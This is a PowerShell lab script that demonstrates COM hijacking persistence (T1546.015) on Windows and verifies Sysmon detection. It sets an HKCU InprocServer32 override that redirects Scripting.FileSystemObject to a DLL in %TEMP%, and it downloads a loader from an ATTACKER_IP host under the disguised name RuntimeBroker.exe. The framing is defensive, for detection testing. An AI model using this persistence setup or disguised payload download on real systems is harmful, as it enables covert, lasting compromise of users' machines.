# =============================================================================
# persist_04_com.ps1 -- COM Object Hijacking Persistence (T1546.015)
# MITRE ATT&CK: T1546.015 - Event Triggered Execution: Component Object Model Hijacking
# =============================================================================
# Target (CLSID / ProgID / DLL names kept consistent everywhere):
#   CLSID : {0D43FE01-F093-11CF-8940-00A0C9054228}
#   ProgID: Scripting.FileSystemObject  (Scripting Runtime)
#   Legit : HKLM\SOFTWARE\Classes\CLSID\{GUID}\InprocServer32
#           -> %SystemRoot%\System32\scrrun.dll
#
# Why this works without Admin (HKCR merged view):
#   HKCR is a merged view of HKLM\Software\Classes and HKCU\Software\Classes.
#   Per-user (HKCU) entries take precedence over HKLM, so writing
#   InprocServer32 under HKCU makes COM resolve this CLSID to OUR DLL for the
#   current user only. HKLM is never modified -> no Admin rights required.
#
# SCOPE (detection lab):
#   This stage demonstrates COM REDIRECTION + EDR (Sysmon) detection only.
#   The loader (loader_debug.exe - debug/test build) is staged for the full chain but is NOT
#   executed by this script -- executing it would require a weaponized COM DLL
#   whose DllGetClassObject launches the loader, which is out of scope here.
#
# Test DLL (a REAL in-proc COM server, matching architecture):
#   %TEMP%\scrrun_hijack.dll is a copy of this machine's own System32\scrrun.dll.
#   Unlike the old msvcrt.dll placeholder, scrrun.dll is a genuine COM server:
#   it exports DllGetClassObject / DllCanUnloadNow and honors ThreadingModel,
#   so COM can actually instantiate it and fire an ImageLoad event.
#   It is harmless (it IS the real FileSystemObject implementation), and the
#   architecture always matches because the source is the local System32.
#
# Trigger (verified by the script itself, see '-Action trigger'):
#   New-Object -ComObject Scripting.FileSystemObject
#   -> COM resolves the CLSID through HKCR, the HKCU override wins, and the
#      calling process loads %TEMP%\scrrun_hijack.dll instead of scrrun.dll.
#   -> Marker: the hijacked DLL appears in this process' loaded modules,
#      checked via Get-Process -Id $PID).Modules (NOT just file existence).
#
# Evidence / detections expected (Sysmon / EDR focus; Wazuh integration is
# out of scope this round):
#   - Sysmon EID 12 (RegistryEvent: key create/delete) - CLSID key creation
#   - Sysmon EID 13 (RegistryEvent: value set)         - HKCU\...\{GUID}\InprocServer32
#   - Sysmon EID 7  (ImageLoad)                        - scrrun_hijack.dll from %TEMP%
#     (Sysmon config must actually collect RegistryEvent + ImageLoad)
#   'test' verifies EID 13 AND EID 7 separately (one of them alone is not enough).
#
# Safety:
#   - -Action is MANDATORY -- running the script without it never touches the
#     registry by accident.
#   - 'install' REFUSES to run twice in a row (a second install would back up
#     the already-hijacked state and break 'remove'). Run '-Action remove' first.
#   - 'install' backs up the pre-install HKCU state + payload provenance to
#     %TEMP%\com_hijack_backup.json (HKLM value is recorded for reference only).
#   - 'remove' RESTORES the pre-install state exactly:
#       * prior HKCU override      -> values put back (incl. removing our
#         ThreadingModel if the original key had none)
#       * no prior override        -> HKCU key deleted (pre-install state)
#       * payload file is deleted ONLY if this script downloaded it; a
#         pre-existing loader file is never touched.
#   - HKLM is never modified at any point.
#   - A session transcript of every action is appended to
#     %TEMP%\persist_04_evidence.log for the report.
#
# Lab flow (run inside the VM snapshot, screenshot each step):
#   .\persist_04_com.ps1 -Action install   ->  Sysmon EID 12/13
#   .\persist_04_com.ps1 -Action trigger   ->  Sysmon EID 7, module marker
#   .\persist_04_com.ps1 -Action test      ->  verifies marker + EID 13 AND EID 7
#   .\persist_04_com.ps1 -Action remove    ->  restores pre-install state
# =============================================================================

param(
    [Parameter(Mandatory = $true)]
    [ValidateSet("install","trigger","test","remove")]
    [string]$Action
)

# ==============================================================================
# CONFIG
# ==============================================================================
$ATTACKER_IP  = "192.168.247.139"
$PAYLOAD_URL  = "http://${ATTACKER_IP}:9090/loader_debug.exe"
$PAYLOAD_PATH = "$env:LOCALAPPDATA\Microsoft\WindowsApps\RuntimeBroker.exe"

# COM Hijacking config -- CLSID/ProgID must stay consistent (see header)
$COM_GUID     = "{0D43FE01-F093-11CF-8940-00A0C9054228}"
$COM_PROGID   = "Scripting.FileSystemObject"
$COM_REG_BASE = "HKCU:\Software\Classes\CLSID\$COM_GUID"
$COM_INPROC   = "$COM_REG_BASE\InprocServer32"

# Test DLL = copy of the real system COM server for this CLSID
$SOURCE_DLL   = "$env:SystemRoot\System32\scrrun.dll"
$DLL_PATH     = "$env:TEMP\scrrun_hijack.dll"

$BACKUP_FILE  = "$env:TEMP\com_hijack_backup.json"
$EVIDENCE_LOG = "$env:TEMP\persist_04_evidence.log"
# ==============================================================================

function Download-Payload {
    if (-not (Test-Path $PAYLOAD_PATH)) {
        Write-Host "[*] Downloading payload from $PAYLOAD_URL ..." -ForegroundColor Yellow
        try {
            Invoke-WebRequest -Uri $PAYLOAD_URL -OutFile $PAYLOAD_PATH -UseBasicParsing -ErrorAction Stop
            Write-Host "[+] Payload staged (NOT executed by this demo): $PAYLOAD_PATH" -ForegroundColor Green
        } catch {
            Write-Warning "[!] Download failed. Creating dummy payload for testing..."
            [System.IO.File]::WriteAllText($PAYLOAD_PATH, "# dummy payload")
        }
    } else {
        Write-Host "[*] Payload already exists at $PAYLOAD_PATH (pre-existing file)" -ForegroundColor Cyan
    }
}

function Backup-OriginalState {
    param([bool]$PayloadPreExisted)

    $hkcu = Get-ItemProperty -Path $COM_INPROC -ErrorAction SilentlyContinue
    $hklm = Get-ItemProperty -Path "HKLM:\SOFTWARE\Classes\CLSID\$COM_GUID\InprocServer32" -ErrorAction SilentlyContinue

    $backup = [pscustomobject]@{
        Guid               = $COM_GUID
        BackupAt           = (Get-Date).ToString("o")
        HKCUExisted        = [bool]$hkcu
        HKCUDefault        = if ($hkcu) { $hkcu."(default)" } else { $null }
        HKCUThreadingModel = if ($hkcu) { $hkcu.ThreadingModel } else { $null }
        HKLMDefault        = if ($hklm) { $hklm."(default)" } else { $null }  # reference only -- HKLM is never modified
        PayloadPreExisted  = $PayloadPreExisted
    }
    $backup | ConvertTo-Json | Set-Content -Path $BACKUP_FILE -Encoding UTF8

    Write-Host "[*] Pre-install state backed up -> $BACKUP_FILE" -ForegroundColor Gray
    Write-Host "    HKCU override existed before install : $($backup.HKCUExisted)" -ForegroundColor Gray
    Write-Host "    HKLM InprocServer32 (reference only) : $($backup.HKLMDefault)" -ForegroundColor Gray
    Write-Host "    Payload pre-existed (won't delete)   : $($backup.PayloadPreExisted)" -ForegroundColor Gray
}

function Install-Persistence {
    Write-Host "`n[*] Installing COM Hijacking persistence..." -ForegroundColor Cyan
    Write-Host "    CLSID  : $COM_GUID" -ForegroundColor Gray
    Write-Host "    ProgID : $COM_PROGID" -ForegroundColor Gray

    # Re-install guard: a second install would back up the ALREADY-HIJACKED
    # state, so 'remove' would then "restore" the hijack instead of the original.
    if (Test-Path $BACKUP_FILE) {
        $cur = (Get-ItemProperty -Path $COM_INPROC -ErrorAction SilentlyContinue)."(default)"
        if ($cur -eq $DLL_PATH) {
            Write-Host "[!] ALREADY INSTALLED (HKCU InprocServer32 -> $DLL_PATH)." -ForegroundColor Red
            Write-Host "    Run '.\persist_04_com.ps1 -Action remove' first. Existing backup preserved." -ForegroundColor Yellow
            return $false
        }
        Write-Host "[*] Stale backup found (no active hijack) -> will be refreshed." -ForegroundColor Yellow
    }

    $payloadPreExisted = Test-Path $PAYLOAD_PATH
    Download-Payload

    if (-not (Test-Path $SOURCE_DLL)) {
        Write-Error "[!] Source COM DLL not found: $SOURCE_DLL"
        return $false
    }
    Copy-Item -Path $SOURCE_DLL -Destination $DLL_PATH -Force
    Write-Host "[+] Test DLL staged: $DLL_PATH" -ForegroundColor Green
    Write-Host "    (copy of $SOURCE_DLL -- real COM server: DllGetClassObject /" -ForegroundColor Gray
    Write-Host "     DllCanUnloadNow exported, architecture matches local System32)" -ForegroundColor Gray

    Backup-OriginalState -PayloadPreExisted $payloadPreExisted

    try {
        # Create CLSID key in HKCU -- Sysmon EID 12 (key create) triggers here
        New-Item -Path $COM_INPROC -Force | Out-Null
        # Sysmon EID 13 (value set) triggers here
        Set-ItemProperty -Path $COM_INPROC -Name "(Default)"      -Value $DLL_PATH  -Type String -Force
        Set-ItemProperty -Path $COM_INPROC -Name "ThreadingModel" -Value "Apartment" -Type String -Force

        Write-Host "[+] COM Hijacking registry set:" -ForegroundColor Green
        Write-Host "    RegPath: $COM_INPROC" -ForegroundColor Gray
        Write-Host "    DLL    : $DLL_PATH" -ForegroundColor Gray
        Write-Host "[+] Persistence installed." -ForegroundColor Green
        Write-Host "[!] Trigger with: .\persist_04_com.ps1 -Action trigger" -ForegroundColor Yellow
        return $true
    } catch {
        Write-Error "[!] Failed to install COM hijacking: $_"
        return $false
    }
}

function Invoke-Trigger {
    Write-Host "`n[*] Triggering COM activation of $COM_PROGID ..." -ForegroundColor Cyan
    Write-Host "    (COM resolves CLSID via HKCR -> HKCU override wins -> hijack DLL loads)" -ForegroundColor Gray

    $fso = $null
    try {
        $fso = New-Object -ComObject $COM_PROGID
    } catch {
        Write-Host "[-] COM activation failed: $_" -ForegroundColor Red
        return $false
    }
    Start-Sleep -Milliseconds 500

    # MARKER: proof of execution is the hijacked DLL being loaded into THIS
    # process -- not merely that the file exists on disk.
    $loaded = @((Get-Process -Id $PID).Modules | Where-Object { $_.FileName -eq $DLL_PATH })
    try { [void][Runtime.InteropServices.Marshal]::ReleaseComObject($fso) } catch { }

    if ($loaded.Count -gt 0) {
        Write-Host "[+] MARKER POSITIVE: $DLL_PATH loaded in PID $PID -> hijack worked" -ForegroundColor Green
        Write-Host "    Sysmon EID 7 (ImageLoad) should now reference this DLL (see '-Action test')" -ForegroundColor Gray
        return $true
    }
    Write-Host "[-] MARKER NEGATIVE: hijack DLL NOT loaded (System32\scrrun.dll was used)." -ForegroundColor Red
    Write-Host "    Check: install ran in this same user session and same arch (x64/x86)." -ForegroundColor Yellow
    return $false
}

function Get-SysmonEvidence {
    $found = @()
    foreach ($id in 12,13,7) {
        $events = $null
        try {
            $events = Get-WinEvent -FilterHashtable @{
                LogName = "Microsoft-Windows-Sysmon/Operational"; Id = $id
            } -MaxEvents 300 -ErrorAction Stop
        } catch { $events = $null }  # Sysmon log missing or no matching events

        foreach ($e in $events) {
            if ($e.Message -like "*$COM_GUID*" -or $e.Message -like "*scrrun_hijack.dll*") {
                $first = ($e.Message -split "`r?`n" | Where-Object { $_ -match "(TargetObject|ImageLoaded|Image|EventType)" } | Select-Object -First 3) -join " | "
                $found += [pscustomobject]@{ EventId = $id; Time = $e.TimeCreated; Detail = $first }
            }
        }
    }
    return $found
}

function Test-Persistence {
    Write-Host "`n[*] Verifying COM Hijacking persistence (marker + Sysmon, not just files)..." -ForegroundColor Cyan
    $ok = $true

    if (Test-Path $COM_INPROC) {
        $val = (Get-ItemProperty -Path $COM_INPROC -ErrorAction SilentlyContinue)."(default)"
        Write-Host "[+] COM CLSID key EXISTS, InprocServer32 = $val" -ForegroundColor Green
        if ($val -ne $DLL_PATH) {
            Write-Host "[-] InprocServer32 does NOT point to $DLL_PATH" -ForegroundColor Red
            $ok = $false
        }
    } else {
        Write-Host "[-] COM CLSID key NOT found: $COM_INPROC" -ForegroundColor Red
        $ok = $false
    }

    if (Test-Path $BACKUP_FILE) {
        Write-Host "[+] Backup file EXISTS: $BACKUP_FILE" -ForegroundColor Green
    } else {
        Write-Host "[-] Backup file MISSING (was install run?): $BACKUP_FILE" -ForegroundColor Red
        $ok = $false
    }

    # Execution marker: the hijacked DLL must actually LOAD, not just exist
    if (-not (Invoke-Trigger)) { $ok = $false }

    Write-Host "`n[*] Querying Sysmon operational log for EID 12/13/7 evidence..." -ForegroundColor Cyan
    $ev   = @(Get-SysmonEvidence)
    $eid12 = @($ev | Where-Object { $_.EventId -eq 12 })
    $eid13 = @($ev | Where-Object { $_.EventId -eq 13 })
    $eid7  = @($ev | Where-Object { $_.EventId -eq 7  })

    foreach ($e in $ev) {
        Write-Host ("[+] Sysmon EID {0} @ {1}  {2}" -f $e.EventId, $e.Time, $e.Detail) -ForegroundColor Green
    }

    # EID 13 (registry write) AND EID 7 (ImageLoad) must BOTH exist -- finding
    # only one of them is not proof that install + trigger both happened.
    if ($eid13.Count -gt 0) {
        Write-Host "[+] EID 13 (registry set) found: $($eid13.Count) event(s) -- install evidence" -ForegroundColor Green
    } else {
        Write-Host "[-] EID 13 (registry set) NOT found -- install not done or Sysmon misses RegistryEvent" -ForegroundColor Red
        $ok = $false
    }
    if ($eid7.Count -gt 0) {
        Write-Host "[+] EID 7  (ImageLoad) found: $($eid7.Count) event(s) -- trigger evidence" -ForegroundColor Green
    } else {
        Write-Host "[-] EID 7  (ImageLoad) NOT found -- trigger not done or Sysmon misses ImageLoad" -ForegroundColor Red
        $ok = $false
    }
    if ($eid12.Count -eq 0) {
        Write-Host "[*] EID 12 (key create/delete) not found (informational -- depends on Sysmon config)" -ForegroundColor Yellow
    }

    if ($ok) { Write-Host "`n[RESULT] Persistence ACTIVE + evidence captured v" -ForegroundColor Green }
    else     { Write-Host "`n[RESULT] Persistence INCOMPLETE / not yet triggered x" -ForegroundColor Red }
    return $ok
}

function Remove-Persistence {
    Write-Host "`n[*] Removing COM Hijacking persistence (RESTORING pre-install state)..." -ForegroundColor Cyan

    $backup = $null
    if (Test-Path $BACKUP_FILE) {
        $backup = Get-Content -Path $BACKUP_FILE -Raw | ConvertFrom-Json
    }

    if ($backup -and $backup.HKCUExisted) {
        # There WAS a pre-existing HKCU override -> put its original values back
        New-Item -Path $COM_INPROC -Force | Out-Null
        Set-ItemProperty -Path $COM_INPROC -Name "(Default)" -Value $backup.HKCUDefault -Type String -Force
        if ($backup.HKCUThreadingModel) {
            Set-ItemProperty -Path $COM_INPROC -Name "ThreadingModel" -Value $backup.HKCUThreadingModel -Type String -Force
        } else {
            # Original key had NO ThreadingModel -> remove the one install added,
            # otherwise our "Apartment" would survive the restore.
            Remove-ItemProperty -Path $COM_INPROC -Name "ThreadingModel" -ErrorAction SilentlyContinue
        }
        Write-Host "[+] RESTORED pre-install HKCU override (default = $($backup.HKCUDefault))" -ForegroundColor Green
    }
    elseif (Test-Path $COM_REG_BASE) {
        # No override existed before install -> pre-install state = key absent
        Remove-Item -Path $COM_REG_BASE -Recurse -Force -ErrorAction SilentlyContinue
        Write-Host "[+] Pre-install state restored: no prior HKCU override -> HKCU key removed" -ForegroundColor Green
        Write-Host "    (HKLM was never modified, so the legit scrrun.dll mapping is intact)" -ForegroundColor Gray
    }
    else {
        Write-Host "[-] HKCU CLSID key not found (already removed?)" -ForegroundColor Yellow
    }

    # Files created by THIS script are always cleaned up...
    foreach ($f in @($DLL_PATH, $BACKUP_FILE)) {
        if (Test-Path $f) {
            Remove-Item -Path $f -Force -ErrorAction SilentlyContinue
            Write-Host "[+] Removed: $f" -ForegroundColor Green
        } else {
            Write-Host "[-] Not found: $f" -ForegroundColor Yellow
        }
    }

    # ...but the payload is deleted ONLY if this script downloaded it.
    # A pre-existing loader file is never touched (provenance unknown -> keep).
    if ($backup -and -not $backup.PayloadPreExisted) {
        if (Test-Path $PAYLOAD_PATH) {
            Remove-Item -Path $PAYLOAD_PATH -Force -ErrorAction SilentlyContinue
            Write-Host "[+] Removed payload downloaded by this script: $PAYLOAD_PATH" -ForegroundColor Green
        }
    } else {
        Write-Host "[*] Payload kept (pre-existed before install or provenance unknown): $PAYLOAD_PATH" -ForegroundColor Gray
    }
    Write-Host "[+] Cleanup complete (Sysmon EID 12 should show the key delete)." -ForegroundColor Green
}

# ==============================================================================
# Main Logic -- transcript kept as report evidence
# ==============================================================================
try { Start-Transcript -Path $EVIDENCE_LOG -Append | Out-Null } catch { }

Write-Host "============================================================" -ForegroundColor Magenta
Write-Host " persist_04_com.ps1 -- T1546.015 COM Object Hijacking" -ForegroundColor Magenta
Write-Host " Target: $COM_PROGID  $COM_GUID" -ForegroundColor Magenta
Write-Host " Evidence log: $EVIDENCE_LOG" -ForegroundColor Magenta
Write-Host "============================================================" -ForegroundColor Magenta

switch ($Action) {
    "install" { Install-Persistence }
    "trigger" { Invoke-Trigger | Out-Null }
    "test"    { Test-Persistence }
    "remove"  { Remove-Persistence }
}

try { Stop-Transcript | Out-Null } catch { }
